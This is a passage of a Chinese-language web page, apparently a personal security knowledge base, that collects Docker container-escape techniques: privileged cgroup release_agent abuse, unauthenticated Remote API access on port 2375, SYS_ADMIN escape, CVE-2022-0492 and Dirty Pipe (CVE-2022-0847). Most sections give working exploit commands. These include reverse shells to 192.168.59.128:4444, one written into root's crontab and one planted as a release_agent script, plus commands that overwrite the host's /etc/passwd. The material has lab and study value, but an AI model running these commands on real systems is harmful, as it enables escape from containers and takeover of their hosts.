<span class="line"><span>host_overlay2_fs_dir=$(sed -n &#39;s/.*\\upperdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab)</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 在容器根目录下创建payload文件并写入执行脚本(Payload)。</span></span>
<span class="line"><span>echo &#39;#!/bin/sh&#39; &gt; /payload</span></span>
<span class="line"><span># 在容器根目录下创建payload文件并写入执行脚本(Payload)。</span></span>
<span class="line"><span>echo &quot;touch /hacker-privileged&quot; &gt;&gt; /payload</span></span>
<span class="line"><span># 给payload增加执行权限。</span></span>
<span class="line"><span>chmod a+x /payload</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 将host_overlay2_fs_dir与payload目录拼接，目的是在notify_on_release运行时指向容器外的宿主机中的payload文件</span></span>
<span class="line"><span>echo &quot;$host_overlay2_fs_dir/payload&quot; &gt; $cgroup_dir/release_agent</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 将一个执行即退出的进程触发notify_on_release。</span></span>
<span class="line"><span>sh -c &quot;echo \\$\\$ &gt; $cgroup_dir/test_subsystem/cgroup.procs&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>在特权模式下，容器内部可以执行任意系统调用，/sys和/proc路径都是可写的，容器可以获取真实的进程ID，用户ID，组ID等信息，还可以使用chroot等系统调用来改变容器环境。</p></blockquote><h2 id="远程api未授权访问逃逸" tabindex="-1"><a class="header-anchor" href="#远程api未授权访问逃逸"><span>远程API未授权访问逃逸</span></a></h2><p>使用Docker Swarm时，管理的docker 节点上便会开放一个TCP端口2375/2376，绑定在0.0.0.0上，http访问会返回 404 page not found。这是 Docker RemoteAPI，可以执行docker命令，比如访问 <a href="http://x.x.x.x:2375/containers/json" target="_blank" rel="noopener noreferrer">http://x.x.x.x:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。</p><h3 id="环境-3" tabindex="-1"><a class="header-anchor" href="#环境-3"><span>环境</span></a></h3><p>在配置Docker启动文件时，添加了允许任何网段访问<code>Docker Remote API</code>。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124142843398.png" alt="image-20240124142843398" tabindex="0" loading="lazy"><figcaption>image-20240124142843398</figcaption></figure><h3 id="检测-2" tabindex="-1"><a class="header-anchor" href="#检测-2"><span>检测</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>IP=\`hostname -i | awk -F. &#39;{print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;}&#39; \` &amp;&amp; timeout 3 bash -c &quot;echo &gt;/dev/tcp/$IP/2375&quot; &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Docker Remote API Is Enabled.&quot; || echo &quot;Docker Remote API is Closed.&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124143031312.png" alt="image-20240124143031312" tabindex="0" loading="lazy"><figcaption>image-20240124143031312</figcaption></figure><h3 id="利用-3" tabindex="-1"><a class="header-anchor" href="#利用-3"><span>利用</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker -H tcp://192.168.59.128:2375 run -it -v /:/mnt nginx:latest /bin/bash</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>echo &#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.59.128/4444 0&gt;&amp;1&#39; &gt;&gt; /mnt/var/spool/cron/crontabs/root</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p>利用这个方法，需要知道docker服务所在的ip</p><p>由于容器内无法执行docker操作，<a href="http://xn--docker-hp7iy6anyy92lv5h724k2jg.io" target="_blank" rel="noopener noreferrer">所以重新下载了docker.io</a></p></blockquote><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124145812000.png" alt="image-20240124145812000" tabindex="0" loading="lazy"><figcaption>image-20240124145812000</figcaption></figure><h2 id="sys-admin容器逃逸" tabindex="-1"><a class="header-anchor" href="#sys-admin容器逃逸"><span>SYS_Admin容器逃逸</span></a></h2><h3 id="条件" tabindex="-1"><a class="header-anchor" href="#条件"><span>条件</span></a></h3><p>如果一个Docker容器的启动方式满足以下条件，攻击者在容器中就可以逃逸到宿主机上。</p><ol><li>以root用户的身份在容器内运行；</li><li>容器启用<code>SYS_ADMIN</code> <code>Capability</code>；（linux的权限划分机制）</li><li>容器没有启用Docker默认的<code>AppArmor</code>配置文件docker-default，或者AppArmor允许运行<code>mount syscall</code></li></ol><h3 id="环境-4" tabindex="-1"><a class="header-anchor" href="#环境-4"><span>环境</span></a></h3><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --security-opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> apparmor=unconfined</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --cap-add=SYS_ADMIN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ubuntu</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> bash</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">--cap-add</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">SYS_ADMIN表示给Docker容器SYS_ADMIN的Capability。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">--security-opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> apparmor=unconfined表示去除Docker默认的AppArmor配置</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">CentOS和Red</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Hat上可不添加此参数</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="检测-3" tabindex="-1"><a class="header-anchor" href="#检测-3"><span>检测</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span># apt update &amp;&amp; apt install libcap2-bin -y</span></span>
<span class="line"><span>capsh --print|grep -qi cap_sys_admin &amp;&amp; echo &#39;SYS_ADMIN is exist!&#39; || echo &#39;SYS_ADMIN is Not exist!&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="利用-4" tabindex="-1"><a class="header-anchor" href="#利用-4"><span>利用</span></a></h3><p>POC1</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /tmp/cgrp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cgroup</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> memory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /tmp/cgrp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /tmp/cgrp/x</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//在容器里创建一个临时目录/tmp/cgrp，并使用mount命令将系统默认的memory类型的cgroup重新挂载到/tmp/cgrp上</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/tmp/cgrp/x/notify_on_release</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//设置参数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">host_path</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">\`</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sed</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab\`</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//获取docker容器在宿主机上的存储路径</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$host_path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/cmd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/tmp/cgrp/release_agent</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;#!/bin/sh&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/cmd</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;sh -i &gt;&amp; /dev/tcp/192.168.59.128/4444 0&gt;&amp;1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/cmd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> a+x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /cmd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//POC将要执行的shell写到cmd文件里，并赋予执行权限</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;echo </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\$\\$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//将一个执行即退出的进程ID写入到此cgroup子系统的cgroup.procs中去触发notify_on_release</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果你出现mount的错误，这是因为你的配置中没有RDMA cgroup控制器，尝试将rdma更改为memory来修复它</p><blockquote><p>在 Linux cgroup 中，<code>notify_on_release</code> 是一个特性标志，当其设置为1（启用）时，当 cgroup 中的最后一个任务（进程）结束（退出或附加到其它 cgroup）时，就会触发一个事件。此事件通常是执行一个事先设置好的 <code>release_agent</code> 脚本</p><p>我们利用这个特性，将脚本修改为我们执行的命令</p><p>在我看来，这也是特权逃逸的一种，没有复现成功，添加--privileged也无济于事</p></blockquote><h2 id="cve-2022-0492" tabindex="-1"><a class="header-anchor" href="#cve-2022-0492"><span>CVE-2022-0492</span></a></h2><p>这是在内核中新发现的一个权限提升漏洞。据公告称，该漏洞是由于control groups（cgroups）中的一个逻辑错误所致；</p><p>虽然SYS_ADMIN逃逸同样利用到release_agent这个特性，不过并不需要SYS_ADMIN的特权，<strong>只需要</strong>关闭Docker默认开启的两大安全特性：<code>AppArmor</code>和<code>Seccomp</code>就可以成功利用了</p><h3 id="条件-1" tabindex="-1"><a class="header-anchor" href="#条件-1"><span>条件</span></a></h3><p>Linux Kernel &gt;= 5<br> Linux Kernel &lt;= 5.15.26<br> Docker &gt;= 20.10.14</p><h3 id="环境-5" tabindex="-1"><a class="header-anchor" href="#环境-5"><span>环境</span></a></h3><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ti</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --security-opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> apparmor=unconfined</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --security-opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> seccomp=unconfined</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ubuntu</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> bash</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="利用-5" tabindex="-1"><a class="header-anchor" href="#利用-5"><span>利用</span></a></h3><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 通过unshare创建新的Namespace，隔离用户、映射root用户、隔离mount和cgroup并运行bash。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">unshare</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -UrmC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --propagation=unchanged</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> bash</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 增加挂载cgroups文件系统操作</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /tmp/cgroup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mount</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cgroup</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> rdma</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /tmp/cgroup</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 修改cgroup_dir对应目录路径</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cgroup_dir</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/tmp/cgroup</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mkdir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $cgroup_dir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/boysec</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$cgroup_dir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/boysec/notify_on_release</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">host_overlay2_fs_dir</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sed</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;s/.*\\upperdir=\\([^,]*\\).*/\\1/p&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/mtab</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;#!/bin/sh&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/script</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;touch /hacked_by_boysec&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/script</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$host_overlay2_fs_dir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/script&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$cgroup_dir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/release_agent</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> a+x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /script</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;echo </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\$\\$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &gt; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$cgroup_dir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/boysec/cgroup.procs&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="cve-2022-0847-脏管道逃逸" tabindex="-1"><a class="header-anchor" href="#cve-2022-0847-脏管道逃逸"><span>CVE-2022-0847(脏管道逃逸)</span></a></h2><p>CVE-2022-0847-DirtyPipe-Exploit 是存在于 Linux 内核 5.8 及之后版本中的本地提权漏洞。</p><p>攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root</p><p>这个内核漏洞同样可用于docker逃逸</p><h3 id="条件-2" tabindex="-1"><a class="header-anchor" href="#条件-2"><span>条件</span></a></h3><p>高于 5.8 的 Linux 内核版本会受到影响</p><p>到目前为止，该漏洞已在以下 Linux 内核版本中<strong>修复</strong>：</p><p>Linux Kernel 5.16.11以上</p><p>Linux Kernel 5.15.26以上</p><p>Linux Kernel 5.10.102以上</p><h3 id="环境-6" tabindex="-1"><a class="header-anchor" href="#环境-6"><span>环境</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run --rm -it -v $(pwd):/exp --cap-add=CAP_DAC_READ_SEARCH ubuntu</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="检测-4" tabindex="-1"><a class="header-anchor" href="#检测-4"><span>检测</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span># apt update &amp;&amp; apt install libcap2-bin -y</span></span>
<span class="line"><span>capsh --print |grep -i cap_dac_read_search &amp;&amp; echo &#39;CVE-2022-0847 is exist!&#39; || echo &#39;CVE-2022-0847 is Not exist!&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="利用-6" tabindex="-1"><a class="header-anchor" href="#利用-6"><span>利用</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>/exp/dp /etc/passwd 1 ootz: # overwrite /etc/password on host from offset 1</span></span>
<span class="line"><span>/etc/dp /etc/passwd # dump /etc/passwd on host</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>通过利用<code>CAP_DAC_READ_SEARCH</code>与脏管道可以实现覆盖主机文件, 实际上主要是<code>CAP_DAC_READ_SEARCH</code>可以调用<code>open_by_handle_at</code>, 可以获得主机文件的文件描述符，配合脏管道于是就可以修改主机文件。</p><p>不过该逃逸有个缺点，覆盖文件的第一个字节无法修改，可以写计划任务</p></blockquote>`,91)]))}const d=i(l,[["render",t],["__file","Docker漏洞汇总.html.vue"]]),k=JSON.parse('{"path":"/%E4%BA%91/Docker/Docker%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB.html","title":"Docker漏洞汇总","lang":"zh-CN","frontmatter":{"description":"Docker漏洞汇总 Docker容器挂载 (伪文件系统)procfs 逃逸 procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时(Docker默认是不会做用户隔离...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E4%BA%91/Docker/Docker%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Docker漏洞汇总"}],["meta",{"property":"og:description","content":"Docker漏洞汇总 Docker容器挂载 (伪文件系统)procfs 逃逸 procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时(Docker默认是不会做用户隔离..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240122201502815.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Docker漏洞汇总\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240122201502815.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240122210529691.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124132243071.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124142843398.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124143031312.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124145812000.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"Docker容器挂载 (伪文件系统)procfs 逃逸","slug":"docker容器挂载-伪文件系统-procfs-逃逸","link":"#docker容器挂载-伪文件系统-procfs-逃逸","children":[{"level":3,"title":"环境","slug":"环境","link":"#环境","children":[]},{"level":3,"title":"利用","slug":"利用","link":"#利用","children":[]}]},{"level":2,"title":"挂载Docker 